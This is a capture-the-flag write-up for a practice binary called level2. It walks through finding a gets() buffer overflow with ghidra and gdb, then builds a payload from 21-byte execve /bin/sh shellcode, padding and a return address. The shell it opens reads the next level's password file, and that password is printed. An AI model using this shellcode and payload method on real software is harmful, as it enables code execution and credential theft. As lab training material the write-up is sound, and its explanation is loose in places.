# level2

We found an exec again. SCP into local to run ghidra.
there is a fn main that calls fn p().

There is a no call to /bin/sh, so we will have to insert some shellcode

    shellcode:
    http://shell-storm.org/shellcode/files/shellcode-575.html

    "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

We found a call to gets() again, but this time it is protected by a restriction on our return address, it can't point to any address in the stack since bytes in the stack are in range 0xbf000000 - 0xbffffff, so we cannot overflow there. 

After a lot of searching we realise we can inject gets() into the strdup function along with shellcode to access /bin/sh. 

    (gdb) run
    Starting program: /home/user/level2/level2 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? ()

0x37634136 -> 7cA6 so we found an offset of 80

21 - bytes shell code
59 - bytes padding
4 - bytes return address (to gets())

    $ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"'; cat) | ./level2
    j
    X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02